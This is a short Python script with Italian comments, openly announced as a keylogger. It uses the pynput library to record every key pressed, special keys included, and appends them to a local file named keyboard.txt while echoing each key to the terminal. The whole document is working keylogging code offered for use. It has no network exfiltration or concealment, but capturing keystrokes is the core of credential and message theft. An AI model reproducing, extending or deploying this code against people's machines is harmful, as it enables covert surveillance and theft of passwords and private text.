from pynput import keyboard

def keyPressed(key):
    print(f"Intercettato: {key}") #Facoltativo abilitarlo o, serve a stampare i tasti anche sul terminale
    
    with open("keyboard.txt", 'a') as logKey:
        try:
            logKey.write(key.char) #Tasti standard
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(' ') #Space, scrive uno spazio nel file
            elif key == keyboard.Key.enter:
                logKey.write('\n') #Va a capo nel file
            elif key == keyboard.Key.tab:
                logKey.write('\t') #Inserisce una tabulazione
            else:
                logKey.write(f" [{str(key)}] ") #Per i tasti speciali scrive il nome tra parentesi

if __name__ == "__main__":
    print("Keylogger attivo. Monitoraggio input in corso...")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join() #Lo script rimane in esecuzione attiva